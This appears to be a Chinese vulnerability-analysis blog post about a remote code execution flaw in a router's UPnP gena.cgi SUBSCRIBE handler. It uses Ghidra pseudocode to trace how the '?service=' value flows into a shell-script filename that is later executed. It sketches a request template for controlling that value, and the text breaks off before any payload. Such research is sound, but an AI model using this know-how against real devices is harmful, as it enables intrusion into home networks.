<p>UPnP是实现智能设备端到端网络连接的结构。它也是一种架构在TCP/IP和HTTP技术之上的，分布式、开放的网络结构，以使得在联网的设备间传递控制和数据。UPnP 技术实现了 控制点、设备和 服务之间通讯的支持，并且设备和相关服务的也使用XML定义并且公布出来。使用UPnP，设备可以动态加入网络，自动获得一个IP地址，向其他设备公布它的能力或者获知其他设备的存在和服务，所有这些过程都是自动完成的，此后设备能够彼此直接通讯。 </p>
<p>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。 </p>
<p>由于该漏洞主要涉及到upnp订阅请求处理函数，订阅事件定义在gena协议中，下面介绍下upnp网络中的设备事件。</p>
<h2 id="设备事件"><a href="#设备事件" class="headerlink" title="设备事件"></a>设备事件</h2><p>设备事件是UPnP网络的第四步。一个服务的UPnP描述包括服务响应的动作列表和运行时模拟服务状态的变量列表。当这些变量改变时，服务就会发布更新，则控制点就会收到设备事件。设备事件发送的一般过程如下图： </p>
<p><img src="event.png" alt=""></p>
<p>为了订阅事件，订阅者发送一个订阅消息。如果出版者收到此消息，它将以这个订阅的持续时间作为响应。为了保持订阅，订阅者必须在订阅到期之前进行续订。在订阅者不需要出版者发送的事件时，订阅者必须取消这个订阅。出版者通过发送事件消息提醒订阅者状态变量改变。事件消息包含多个状态变量的名字和这些变量的当前值。在订阅者第一次订阅时，需要发送初始化事件消息，这个事件包含所有事件变量的名和值并且允许订阅者出示化服务变量值。为了支持多个控制点，在动作生效之后所有订阅者都将接到通知。事件消息使用HTTP协议传送，事件详细定义在通用事件通知结构（General Event Notification Architecture）协议中。 </p>
<p>关于upnp的具体实现细节不在这里叙述啦。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>利用binwalk能够直接解压固件，先在文件系统中查找是否有gena.cgi的文件</p>
<p><code>find . -name "gena.cgi"</code></p>
<p>或包含gena.cgi的文件</p>
<p><code>grep -nr "gena.cgi" .</code></p>
<p><img src="grep_gena.cgi.png" alt=""></p>
<p>定位到/htdocs/cgibin，利用Ghidra直接反编译，其中<code>main()</code>函数比较最后一个’/‘之后的参数是否等于gena.cgi。</p>
<p><img src="main().png" alt=""></p>
<p>之后跳转到<code>genacgi_main()</code>函数.</p>
<p><img src="genacgi_main.png" alt=""></p>
<p>该函数在处理UPnP订阅请求过程中，存在远程执行代码漏洞，Ghidra反编译得到<code>genacgi_main()</code>的伪码。（为了方便阅读，对变量进行更名）</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">genacgi_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_method <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  request_uri <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_uri_0x3f <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>request_uri_0x3f<span class="token punctuation">,</span><span class="token string">"?service="</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* 如果不是SUBSCRIBE */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token punctuation">}</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"SERVER_ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_sid <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_SID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_callback <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_CALLBACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_timeout <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_nt <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_NT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  remote_addr <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>http_nt<span class="token punctuation">,</span><span class="token string">"upnp:event"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_callback <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-infinite"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       real_timeout <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          cmp_service <span class="token operator">=</span> <span class="token function">strncasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          request_uri <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004103d8<span class="token punctuation">;</span>
          real_timeout <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>http_timeout <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       sVar1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       http_callback <span class="token operator">=</span> http_callback <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>http_callback <span class="token operator">==</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">,</span><span class="token string">"http://"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_sid <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">*</span>http_sid <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 漏洞点 */</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 处理buf */</span>
            <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"NOTIFY:0:sh %s/%s_%d.sh"</span><span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">xmldbc_timer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p><code>genacgi_main()</code>首先进行一系列判断和取值，其中包括判断<code>REQUEST_METHOD</code>是否为<code>SUBSCRIBE</code>，只有当请求方式为<code>SUBSCRIBE</code>才能触发漏洞，还判断了<code>REQUEST_URI</code>中是否有<code>?service=</code>参数，并将<code>?service=</code>之后的值赋给变量<code>request_uri_0x3f</code>，通过<code>getpid()</code>获得当前的<code>pid()</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>漏洞点位于<code>sprintf()</code>中，<code>sprintf()</code>设置了一个缓冲区buf，将之前取得一些列的值都放到缓冲区buf中，其中我们需要关注的是<code>SHELL_FILE=%s/%s_%d.sh</code>。经过sprintf()之后，缓冲区中有<code>SHELL_FILE=/var/run/request_uri_0x3f_pid.sh</code>，其中<code>request_uri_0x3f</code>上面提到是<code>?service=</code>之后的值。</p>
<p>也就是说如果我们构造如下结构的数据包将可以控制缓冲区中<code>SHELL_FILE</code>的值。</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">REQUEST_METHOD</span> <span class="token operator">=</span> <span class="token constant">SUBSCRIBE</span>
<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 0x3f = </span><span class="token string">'?'</span>
request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#此时request_uri_0x3f = file_name</span></code></pre>
<p>之后缓冲区的buf被<code>xmldbc_ephp()</code>处理。<code>xmldbc_ephp()</code>函数的第三个参数为buf，进入该函数。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>undefined4 param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>undefined4 param_4<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  size_t <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_20<span class="token punctuation">;</span>

  local_20 <span class="token operator">=</span> <span class="token operator">&amp;</span>_gp<span class="token punctuation">;</span>
  <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>param_4<span class="token punctuation">,</span>local_20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现获取了buf的长度之后，<code>FUN_0041420c()</code>处理了buf（第四个参数），继续进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4
<span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>uint param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span>undefined4 buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">,</span>
               <span class="token keyword">int</span> param_6<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 创建socket */</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> __fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar1 <span class="token operator">=</span> <span class="token function">FUN_00413810</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span>param_3<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>首先<code>FUN_0041372c()</code>创建socket</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  sockaddr local_80 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
     <span class="token function">fcntl</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       param_1 <span class="token operator">=</span> <span class="token string">"/var/run/xmldb_sock"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token function">snprintf</span><span class="token punctuation">(</span>local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_data<span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar1 <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>local_80<span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar2 <span class="token operator">=</span> __fd<span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
       <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>之后当_fd &gt; -1时，buf被传入FUN_00413810()中，作为第四个参数，进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_00413810</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span>undefined2 param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_20<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> sVar1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现我们的buf被send给创建好的socket。其实是发送给了php脚本进行处理。</p>
<p>至此整个流程为：buf -&gt; <code>xmldbc_ephp()</code> -&gt; <code>FUN_0041420c()</code> -&gt; <code>FUN_00413810()</code> -&gt; socket。经过xmldbc_ephp()处理后，由buf中的参数<code>/htdocs/upnp/run.NOTIFY.php</code>这个php文件进行处理。</p>
<p>run.NOTIFY.php内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/upnp/xnode.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gvar.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gena.php"</span><span class="token punctuation">;</span>

<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token variable">$G_GENA_NODEBASE</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token variable">$gena_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$SERVICE</span><span class="token punctuation">;</span>
<span class="token function">GENA_subscribe_cleanup</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* IGD services */</span>
<span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"L3Forwarding1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.Layer3Forwarding.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"OSInfo1"</span><span class="token punctuation">)</span>            <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.OSInfo.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANCommonIFC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANCommonInterfaceConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANEthLinkC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANEthernetLinkConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANIPConn1"</span><span class="token punctuation">)</span>        <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANIPConnection.1.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* WFA services */</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WFAWLANConfig1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WFAWLANConfig.1.php"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SID</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
